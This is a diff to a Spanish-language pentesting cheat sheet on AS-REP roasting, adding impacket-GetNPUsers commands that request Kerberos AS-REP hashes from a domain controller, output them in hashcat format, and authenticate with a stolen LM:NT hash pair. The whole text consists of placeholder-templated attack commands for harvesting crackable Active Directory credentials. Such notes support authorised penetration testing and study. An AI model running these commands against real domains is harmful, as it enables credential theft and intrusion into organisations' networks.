@@ -7,7 +7,17 @@ impacket-GetNPUsers <DOMAIN>/ -no-pass -usersfile <FILE-USERS>
 
 #### ASRepRoast Attack - con usuario y contraseña que tengamos
 ```
-impacket-GetNPUsers -dc-ip <IP> -request -outputfile hashes.asreproast <DOMAIN>/<USER>
+impacket-GetNPUsers -dc-ip <IP> -request -outputfile ASREProastables.txt <DOMAIN>/<USER>
+```
+
+#### ASRepRoast Attack - con usuario y contraseña que tengamos y obteniendo el resultado en formato HashCat
+```
+impacket-GetNPUsers -dc-ip <IP> -request -format hashcat -outputfile ASREProastables.txt <DOMAIN>/<USER>
+```
+
+#### ASRepRoast Attack - usando Hash NT de un usuario que tengamos
+```
+impacket-GetNPUsers -dc-ip <IP> -request -outputfile ASREProastables.txt -hashes '<LM-HASH>:<NT-HASH>' <DOMAIN>/<USER>
 ```
 
 ---
